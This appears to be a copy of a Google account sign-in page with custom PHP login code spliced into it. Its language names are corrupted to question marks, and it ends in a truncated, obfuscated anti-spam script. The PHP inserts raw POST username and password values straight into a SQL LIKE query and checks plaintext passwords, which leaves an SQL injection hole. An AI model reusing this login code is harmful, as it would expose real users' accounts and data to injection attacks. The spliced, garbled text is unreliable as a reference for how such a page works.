  </option>
  <option value="fi">
  ?Suomi?
  </option>
  <option value="sv">
  ?Svenska?
  </option>
  <option value="vi">
  ?Ti?ng Vi?t?
  </option>
  <option value="tr">
  ?T?rk?e?
  </option>
  <option value="el">
  ??????????
  </option>
  <option value="bg">
  ???????????
  </option>
  <option value="mn">
  ????????
  </option>
  <option value="ru">
  ?????????
  </option>
  <option value="sr">
  ????????
  </option>
  <option value="uk">
  ????????????
  </option>
  <option value="ka">
  ?????????
  </option>
  <option value="hy">
  ?????????
  </option>
  <option value="iw">
  ????????
  </option>
  <option value="ur">
  ???????
  </option>
  <option value="ar">
  ??????????
  </option>
  <option value="fa">
  ????????
  </option>
  <option value="am">
  ??????
  </option>
  <option value="ne">
  ????????
  </option>
  <option value="mr">
  ???????
  </option>
  <option value="hi">
  ????????
  </option>
  <option value="bn">
  ???????
  </option>
  <option value="gu">
  ?????????
  </option>
  <option value="ta">
  ???????
  </option>
  <option value="te">
  ????????
  </option>
  <option value="kn">
  ???????
  </option>
  <option value="ml">
  ????????
  </option>
  <option value="si">
  ???????
  </option>
  <option value="th">
  ?????
  </option>
  <option value="lo">
  ?????
  </option>
  <option value="km">
  ???????
  </option>
  <option value="ko">
  ?????
  </option>
  <option value="zh-HK">
  ???(??)?
  </option>
  <option value="ja">
  ?????
  </option>
  <option value="zh-CN">
  ??????
  </option>
  <option value="zh-TW">
  ??????
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <?php
} else {
	require_once("db_const.php");
	$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	# check connection
	if ($mysqli->connect_errno) {
		echo "<p>MySQL error no {$mysqli->connect_errno} : {$mysqli->connect_error}</p>";
		exit();
	}

	$username = $_POST['username'];
	$password = $_POST['password'];

	$sql = "SELECT * from login_db WHERE username LIKE '{$username}' AND password LIKE '{$password}' LIMIT 1";
	$result = $mysqli->query($sql);
	if (!$result->num_rows == 1) {
		echo "<p>Invalid username/password combination</p>";
	} else {
		echo "<p>Logged in successfully</p>";
		// do stuffs
	}
}
?>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);
 
          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);
 
              form.appendChild(hiddenField);
            }
          }
 
          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];
 
        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript"> 
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script> 
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.uni-TAB.com\46v\75-780293308',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var D=this,Y=function(E,z,k,B,y){k=E.split("."),B=D,k[0]in B||!B.execScript||B.execScript("var "+k[0]);for(;k.length&&(y=k.shift());)k.length||void 0===z?B=B[y]?B[y]:B[y]={}:B[y]=z},A=function(E,z){return E<z?-1:E>z?1:0},I,b=function(E,z,k){if(z=typeof E,"object"==z)if(E){if(E instanceof Array)return"array";if(E instanceof Object)return z;if(k=Object.prototype.toString.call(E),"[object Window]"==k)return"object";if("[object Array]"==k||"number"==typeof E.length&&"undefined"!=typeof E.splice&&"undefined"!=typeof E.propertyIsEnumerable&&!E.propertyIsEnumerable("splice"))return"array";if("[object Function]"==k||"undefined"!=typeof E.call&&"undefined"!=typeof E.propertyIsEnumerable&&!E.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==z&&"undefined"==typeof E.call)return"object";return z},J;a:{var r=D.navigator;if(r){var j2=r.userAgent;if(j2){I=j2;break a}}I=""}var q="",Eb=function(E){return(E=D.document)?E.documentMode:void 0},S=/\\b(?:MSIE|rv)[: ]([^\\);]+)(\\)|;)/.exec(I),zc=(S&&(q=S?S[1]:""),Eb()),BO=zc>parseFloat(q)?String(zc):q,a=function(E,z,k,B,y,g,t,c,X,Z,l,v){if(!(z=yJ[E])){for(z=0,k=String(BO).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),B=String(E).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),y=Math.max(k.length,B.length),g=0;0==z&&g<y;g++){c=B[g]||"",t=k[g]||"",X=RegExp("(\\\\d*)(\\\\D*)","g"),Z=RegExp("(\\\\d*)(\\\\D*)","g");do{if(l=X.exec(t)||["","",""],v=Z.exec(c)||["","",""],0==l[0].length&&0==v[0].length)break;z=A(0==l[1].length?0:parseInt(l[1],10),0==v[1].length?0:parseInt(v[1],10))||A(0==l[2].length,0==v[2].length)||A(l[2],v[2])}while(0==z)}z=yJ[E]=0<=z}return z},kC=D.document,yJ={},gF=kC?Eb()||("CSS1Compat"==kC.compatMode?parseInt(BO,10):5):void 0,Q=(a("9"),new function(){},9<=gF),tq=function(E,z,k,B,y){for(z=[],B=k=0;B<E.length;B++)y=E.charCodeAt(B),128>y?z[k++]=y:(2048>y?z[k++]=y>>6|192:(55296==(y&64512)&&B+1<E.length&&56320==(E.charCodeAt(B+1)&64512)?(y=65536+((y&1023)<<10)+(E.charCodeAt(++B)&1023),z[k++]=y>>18|240,z[k++]=y>>12&63|128):z[k++]=y>>12|224,z[k++]=y>>6&63|128),z[k++]=y&63|128);return z},DG=!a("9"),K=(a("8"),a("9"),function(E,z){this.type=E,this.currentTarget=this.target=z,this.defaultPrevented=false}),L=function(E,z,k,B,y){K.call(this,E?E.type:""),this.relatedTarget=this.currentTarget=this.target=null,this.charCode=this.keyCode=this.button=this.screenY=this.screenX=this.clientY=this.clientX=this.offsetY=this.offsetX=0,this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=false,this.m=this.state=null,E&&(k=this.type=E.type,y=E.relatedTarget,this.currentTarget=z,this.target=E.target||E.srcElement,B=E.changedTouches?E.changedTouches[0]:null,y||("mouseover"==k?y=E.fromElement:"mouseout"==k&&(y=E.toElement)),this.relatedTarget=y,null===B?(this.offsetY=void 0!==E.offsetY?E.offsetY:E.layerY,this.screenY=E.screenY||0,this.clientX=void 0!==E.clientX?E.clientX:E.pageX,this.screenX=E.screenX||0,this.clientY=void 0!==E.clientY?E.clientY:E.pageY,this.offsetX=void 0!==E.offsetX?E.offsetX:E.layerX):(this.screenY=B.screenY||0,this.screenX=B.screenX||0,this.clientY=void 0!==B.clientY?B.clientY:B.pageY,this.clientX=void 0!==B.clientX?B.clientX:B.pageX),this.altKey=E.altKey,this.keyCode=E.keyCode||0,this.shiftKey=E.shiftKey,this.m=E,this.charCode=E.charCode||("keypress"==k?E.keyCode:0),this.ctrlKey=E.ctrlKey,this.metaKey=E.metaKey,this.state=E.state,this.button=E.button,E.defaultPrevented&&this.preventDefault())},YC=(K.prototype.preventDefault=function(){this.defaultPrevented=true},function(){function E(){}E.prototype=K.prototype,L.Pu=K.prototype,L.prototype=new E,L.xU=function(E,k,B,y,g){for(y=Array(arguments.length-2),g=2;g<arguments.length;g++)y[g-2]=arguments[g];return K.prototype[k].apply(E,y)}}(),L.prototype.preventDefault=function(E){if(L.Pu.preventDefault.call(this),E=this.m,E.preventDefault)E.preventDefault();else if(E.returnValue=false,DG)try{if(E.ctrlKey||112<=E.keyCode&&123>=E.keyCode)E.keyCode=-1}catch(z){}},"closure_listenable_"+(1E6*Math.random()|0)),Xv=function(E,z,k,B,y){this.H=!!B,this.src=z,this.type=k,this.g=null,this.V=y,this.listener=E,this.key=++cO,this.v=this.K=false},Aq=function(E){E.V=null,E.src=null,E.listener=null,E.g=null,E.v=true},w=function(E){this.o=0,this.F={},this.src=E},cO=(w.prototype.add=function(E,z,k,B,y,g,t,c){g=E.toString(),E=this.F[g],E||(E=this.F[g]=[],this.o++);a:{for(t=0;t<E.length;++t)if(c=E[t],!c.v&&c.listener==z&&c.H==!!B&&c.V==y)break a;t=-1}return-1<t?(z=E[t],k||(z.K=false)):(z=new Xv(z,this.src,g,!!B,y),z.K=k,E.push(z)),z},0),u="closure_lm_"+(1E6*Math.random()|0),ZG=function(E){return E in P?P[E]:P[E]="on"+E},lE=function(E){return E=E[u],E instanceof w?E:null},Iu=function(E,z){return E=vO,z=Q?function(k){return E.call(z.src,z.listener,k)}:function(k){if(k=E.call(z.src,z.listener,k),!k)return k}},qV=function(E,z,k,B,y,g,t,c,X,Z){if(B=E.V||E.src,k=E.listener,E.K&&"number"!=typeof E&&E&&!E.v)if((y=E.src)&&y[YC])y.CP(E);else if(t=E.g,g=E.type,y.removeEventListener?y.removeEventListener(g,t,E.H):y.detachEvent&&y.detachEvent(ZG(g),t),rF--,g=lE(y)){if(t=E.type,c=t in g.F){c=g.F[t];b:if("string"==typeof c)X="string"==typeof E&&1==E.length?c.indexOf(E,0):-1;else{for(X=0;X<c.length;X++)if(X in c&&c[X]===E)break b;X=-1}(Z=0<=X)&&Array.prototype.splice.call(c,X,1),c=Z}c&&(Aq(E),0==g.F[t].length&&(delete g.F[t],g.o--)),0==g.o&&(g.src=null,y[u]=null)}else Aq(E);return k.call(B,z)},rF=0,vO=function(E,z,k,B,y){if(E.v)returntrue;if(!Q){if(!(k=z))a:{for(B=D,k=["window","event"];y=k.shift();)if(null!=B[y])B=B[y];else{k=null;break a}k=B}return k=new L(k,this),B=true,B=qV(E,k)}return qV(E,new L(z,this))},W=function(E,z,k,B,y,g,t){if("array"==b(z))for(g=0;g<z.length;g++)W(E,z[g],k,B,y);else if(k=S2(k),E&&E[YC])E.KP(z,k,B,y);else{if(!z)throw Error("Invalid event type");if(g=!!B,!g||Q)if((t=lE(E))||(E[u]=t=new w(E)),k=t.add(z,k,false,B,y),!k.g){if(B=Iu(),B.listener=k,B.src=E,k.g=B,E.addEventListener)E.addEventListener(z.toString(),B,g);else if(E.attachEvent)E.attachEvent(ZG(z.toString()),B);else throw Error("addEventListener and attachEvent are unavailable.");rF++}}},P={},h="__closure_events_fn_"+(1E9*Math.random()>>>0),f=function(E){try{au(this,E)}catch(z){n(this,z)}},e={},QJ=function(E,z){E.Z.push(E.B.slice()),E.B[E.M]=void 0,C(E,E.M,z)},mB=(J=f.prototype,J.D=227,J.P=194,f.prototype.j=function(E,z,k,B){B=this.L(this.P),E=[E,B>>8&255,B&255],void 0!=k&&E.push(k),0==this.L(this.c).length&&(this.B[this.c]=void 0,C(this,this.c,E)),k="",z&&(z.message&&(k+=z.message),z.stack&&(k+=":"+z.stack)),z=this.L(this.I),3<z&&(k=k.slice(0,z-3),z-=k.length+3,k=tq(k.replace(/\\r\\n/g,"\\n")),T(this,this.S,N(k.length,2).concat(k),this.SN)),C(this,this.I,z)},function(E,z,k,B,y,g,t,c,X){return B=function(){return k()},y=f.prototype,X=y.j,c=f,g=y.l,t=y.U,k=function(E,l,v){for(v=0,E=B[y.f],l=E===z,E=E&&E[y.f];E&&E!=g&&E!=t&&E!=c&&E!=X&&20>v;)v++,E=E[y.f];return k[y.Wu+l+!(!E+(v+3>>3))]},B[y.u]=y,k[y.kU]=E,E=void 0,B}),K9=(J.SN=12,function(E,z,k,B,y,g,t){for(k=0,z=[];k<E.length;){if(B=p[E.charAt(k++)],y=k<E.length?p[E.charAt(k)]:0,++k,g=k<E.length?p[E.charAt(k)]:64,++k,t=k<E.length?p[E.charAt(k)]:64,++k,null==B||null==y||null==g||null==t)throw Error();z.push(B<<2|y>>4),64!=g&&(z.push(y<<4&240|g>>2),64!=t&&z.push(g<<6&192|t))}return z}),F=(J.u="toString",function(E,z){for(z=Array(E);E--;)z[E]=255*Math.random()|0;return z}),N=function(E,z,k,B){for(B=z-1,k=[];0<=B;B--)k[z-1-B]=E>>8*B&255;return k},p=(J.J=203,{}),n=function(E,z){E.R=("E:"+z.message+":"+z.stack).slice(0,2048)},au=function(E,z){E.B=[],C(E,E.M,0),C(E,E.P,0),C(E,E.a2,E),C(E,E.D,0),C(E,E.I,2048),C(E,E.w,0),C(E,E.J,{}),C(E,E.OW,"object"==typeof window?window:D),C(E,E.jN,[]),C(E,E.c,[]),E.A=true,C(E,E.S,F(4)),C(E,E.a,[]),C(E,E.$,0),C(E,E.s,E.s),C(E,39,function(E){R(E,1)}),C(E,90,function(E,B,y,z,t){B=O(E),y=O(E),z=O(E),B=E.L(B),t=E.L(O(E)),y=E.L(y),z=E.L(z),0!==B&&W(B,y,L9(E,z,t,true))}),C(E,32,function(E,B,y,z,t,c,X){B=U(E),t=B.h,z=B.G,y=B.W,X=y.length,0==X?c=new z[t]:1==X?c=new z[t](y[0]):2==X?c=new z[t](y[0],y[1]):3==X?c=new z[t](y[0],y[1],y[2]):4==X?c=new z[t](y[0],y[1],y[2],y[3]):E.j(E.N),C(E,B.b,c)}),C(E,107,function(){}),C(E,4,function(E,B,z,g,t,c,X){B=U(E),t=B.h,g=B.G,z=B.W,X=z.length,0==X?c=g[t]():1==X?c=g[t](z[0]):2==X?c=g[t](z[0],z[1]):3==X?c=g[t](z[0],z[1],z[2]):E.j(E.N),C(E,B.b,c)}),C(E,117,function(E,B,z,g,t,c){if(B=O(E),z=O(E),g=O(E),t=O(E),B=E.L(B),z=E.L(z),g=E.L(g),E=E.L(t),"object"==b(B)){for(c in t=[],B)t.push(c);B=t}for(t=0,c=B.length;t<c;t+=g)z(B.slice(t,t+g),E)}),C(E,13,function(E,B,z){B=O(E),z=O(E),C(E,z,E.L(z)-E.L(B))}),C(E,6,function(E){V(E,1)}),C(E,41,function(E,B,z,g){B=O(E),z=O(E),g=O(E),C(E,g,E.L(B)<<z)}),C(E,124,function(E,B,z,g,t){for(B=O(E),z=O(E)<<8|O(E),g=Array(z),t=0;t<z;t++)g[t]=O(E);C(E,B,g)}),C(E,44,function(E,B,z,g){B=O(E),z=O(E),g=O(E),E.L(B)>E.L(z)&&C(E,g,E.L(g)+1)}),C(E,115,function(E,B){B=U(E),C(E,B.b,B.h.apply(B.G,B.W))}),C(E,14,function(E,B,z,g){B=O(E),z=O(E),g=O(E),C(E,g,(E.L(B)in E.L(z))+0)}),C(E,43,function(E){G(E,0)}),C(E,51,function(E){G(E,7)}),C(E,54,function(E,B,z){B=O(E),z=O(E),0!=E.L(B)&&C(E,E.M,E.L(z))}),C(E,123,function(E){R(E,2)}),C(E,118,function(E,B,z,g){B=O(E),z=O(E),g=E.L(O(E)),z=E.L(z),C(E,B,L9(E,z,g))}),C(E,1,function(E,z,y){z=O(E),y=O(E),C(E,y,E.L(y)+E.L(z))}),C(E,29,function(E,z,y){z=O(E),y=O(E),z=E.L(z),C(E,y,z)}),C(E,33,function(E,z,y,g,t,c,X,Z,l,v){if(z=O(E),y=O(E)<<8|O(E),g="",void 0!=E.B[E.X])for(t=E.L(E.X);y--;)c=t[O(E)<<8|O(E)],g+=c;else{for(g=Array(y),t=0;t<y;t++)g[t]=O(E);for(y=[],c=t=0;t<g.length;)X=g[t++],128>X?y[c++]=String.fromCharCode(X):191<X&&224>X?(Z=g[t++],y[c++]=String.fromCharCode((X&31)<<6|Z&63)):239<X&&365>X?(Z=g[t++],l=g[t++],v=g[t++],X=((X&7)<<18|(Z&63)<<12|(l&63)<<6|v&63)-65536,y[c++]=String.fromCharCode(55296+(X>>10)),y[c++]=String.fromCharCode(56320+(X&1023))):(Z=g[t++],l=g[t++],y[c++]=String.fromCharCode((X&15)<<12|(Z&63)<<6|l&63));g=y.join("")}C(E,z,g)}),C(E,9,function(E,z){z=E.L(O(E)),QJ(E,z)}),C(E,69,function(E,z,y,g){z=O(E),y=O(E),g=O(E),C(E,g,E.L(z)||E.L(y))}),C(E,31,function(E,z,y,g){if(z=E.Z.pop()){for(y=O(E);0<y;y--)g=O(E),z[g]=E.B[g];z[E.c]=E.B[E.c],E.B=z}else C(E,E.M,E.O.length)}),C(E,73,function(E,z,y){z=O(E),y=O(E),C(E,y,function(E){return eval(E)}(E.L(z)))}),C(E,47,function(E,z,y,g){z=O(E),y=O(E),g=O(E),C(E,g,E.L(z)|E.L(y))}),C(E,56,function(E,z,y,g){z=O(E),y=O(E),g=O(E),E.L(z)[E.L(y)]=E.L(g)}),C(E,35,function(E){R(E,4)}),C(E,120,function(E,z,y,g){z=O(E),y=O(E),g=O(E),E.L(z)==E.L(y)&&C(E,g,E.L(g)+1)}),C(E,85,function(E){V(E,4)}),C(E,36,function(E,z,y){z=O(E),y=O(E),z=E.L(z),C(E,y,b(z))}),C(E,125,function(E,z,y){z=O(E),y=O(E),C(E,y,E.L(y)%E.L(z))}),C(E,16,function(E,z,y,g){z=O(E),y=O(E),g=O(E),C(E,g,E.L(z)>>y)}),C(E,38,function(E,z,y){z=O(E),y=O(E),C(E,y,E.L(y)*E.L(z))}),C(E,2,function(E){G(E,4)}),C(E,94,function(E,z,y){z=O(E),y=O(E),C(E,y,""+E.L(z))}),C(E,99,function(){}),C(E,95,function(E){V(E,2)}),C(E,111,function(E){G(E,3)}),C(E,25,function(E,z,y,g){z=O(E),y=O(E),g=O(E),y=E.L(y),z=E.L(z),C(E,g,z[y])}),wF(),z&&"!"==z.charAt(0)?E.R=z:(E.O=K9(z),E.O&&E.O.length?(E.Z=[],E.l()):E.j(E.LP))},uE=(J.X=226,J.S=135,J.w=247,J.a=153,function(E,z,k,B){return k=E.L(E.M),E.O&&k<E.O.length?(C(E,E.M,E.O.length),QJ(E,z)):C(E,E.M,z),B=E.l(),C(E,E.M,k),B}),M=function(E,z){return E[z]<<24|E[z+1]<<16|E[z+2]<<8|E[z+3]},PO=function(E,z,k,B){try{for(B=0;84941944608!=B;)E+=(z<<4^z>>>5)+z^B+k[B&3],B+=2654435769,z+=(E<<4^E>>>5)+E^B+k[B>>>11&3];return[E>>>24,E>>16&255,E>>8&255,E&255,z>>>24,z>>16&255,z>>8&255,z&255]}catch(y){throw y;}},wF=(J.a2=248,f.prototype.L=function(E,z){if(z=this.B[E],void 0===z)throw this.j(this.Bu,0,E),this.T;return z()},f.prototype.TH=function(E,z,k,B){try{B=E[(z+2)%3],E[z]=E[z]-E[(z+1)%3]-B^(1==z?B<<k:B>>>k)}catch(y){throw y;}},function(E){for(E=0;64>E;++E)e[E]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(E),p["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(E)]=E;e[64]="",p["+"]=62,p["/"]=63,p["="]=64}),C=(J.kU=36,f.prototype.JG=function(E,z){z.push(E[0]<<24|E[1]<<16|E[2]<<8|E[3]),z.push(E[4]<<24|E[5]<<16|E[6]<<8|E[7]),z.push(E[8]<<24|E[9]<<16|E[10]<<8|E[11])},function(E,z,k){if(z==E.M||z==E.P)E.B[z]?E.B[z].R2(k):E.B[z]=WO(k);else if(z!=E.a&&z!=E.S&&z!=E.c||!E.B[z])E.B[z]=mB(k,E.L);z==E.$&&(E.i=void 0,C(E,E.M,E.L(E.M)+4))}),U=(J.$=196,J.c=128,J.Wu=34,J.EW=42,f.prototype.fP=function(E,z,k,B){if(3==E.length){for(k=0;3>k;k++)z[k]+=E[k];for(k=0,B=[13,8,13,12,16,5,3,10,15];9>k;k++)z[3](z,k%3,B[k])}},J.I=132,J.tG=31,J.jN=173,J.N=22,J.Bu=30,function(E,z,k,B,y,g){for(z={},k=O(E),z.b=O(E),z.W=[],B=O(E)-1,y=O(E),g=0;g<B;g++)z.W.push(O(E));for(z.h=E.L(k),z.G=E.L(y);B--;)z.W[B]=E.L(z.W[B]);return z}),O=function(E,z,k){if(z=E.L(E.M),!(z in E.O))throw E.j(E.tG),E.T;return void 0==E.i&&(E.i=M(E.O,z-4),E.C=void 0),E.C!=z>>3&&(E.C=z>>3,k=[0,0,0,E.L(E.$)],E.pP=PO(E.i,E.C,k)),C(E,E.M,z+1),E.O[z]^E.pP[z%8]},L9=function(E,z,k,B){return function(){if(!B||E.A)return C(E,E.eN,B?[arguments[0].m]:arguments),C(E,E.J,k),uE(E,z)}},T=(J.MK=33,J.cu=15,J.eN=217,J.OW=143,J.T={},function(E,z,k,B,y,g){for(y=E.L(z),z=z==E.S?function(z,B,k,g){if(B=y.length,k=B-4>>3,y.I2!=k){y.I2=k,k=(k<<3)-4,g=[0,0,0,E.L(E.D)];try{y.FD=PO(M(y,k),M(y,k+4),g)}catch(l){throw l;}}y.push(y.FD[B&7]^z)}:function(E){y.push(E)},B&&z(B&255),g=0,B=k.length;g<B;g++)z(k[g])}),WO=(J.zH=21,J.f="caller",J.sW=10,J.s=235,J.LP=17,J.M=197,J.Y=133,function(E,z,k){return k=function(){return E},z=function(){return k()},z.R2=function(z){E=z},z}),S2=(J=f.prototype,function(E){if("function"==b(E))return E;return E[h]||(E[h]=function(z){return 